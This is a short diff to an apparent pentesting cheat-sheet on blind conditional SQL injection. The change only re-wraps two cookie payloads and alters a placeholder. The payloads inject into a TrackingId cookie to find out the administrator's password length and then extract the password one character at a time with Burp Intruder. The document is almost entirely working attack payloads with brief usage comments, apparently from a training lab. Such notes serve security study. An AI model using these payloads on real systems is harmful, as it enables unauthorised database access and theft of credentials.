@@ -2,10 +2,12 @@
 [ WEB > SQLI > BLIND CONDITIONAL ]
 
 // Brute force password length
-Cookie: TrackingId=HS3S6ZqZPdeO812z' and (select 'a' from users where username = 'administrator' and length(password)>19)='a; 
+Cookie: TrackingId=HS3S6ZqZPdeO812z' and 
+(select 'a' from users where username = 'administrator' and length(password)>19)='a; 
 // Condition will return false when not true, so you can deduce.
 
 // Brute force password
-Cookie: TrackingId=HS3S6ZqZPdeO812z' and (select substring(password, 1,1) from users where username = 'administrator')='$a$;
+Cookie: TrackingId=HS3S6ZqZPdeO812z' and 
+(select substring(password, 1,1) from users where username = 'administrator')='a;
 // Use intruder for $a$ in Burp Suite.
 
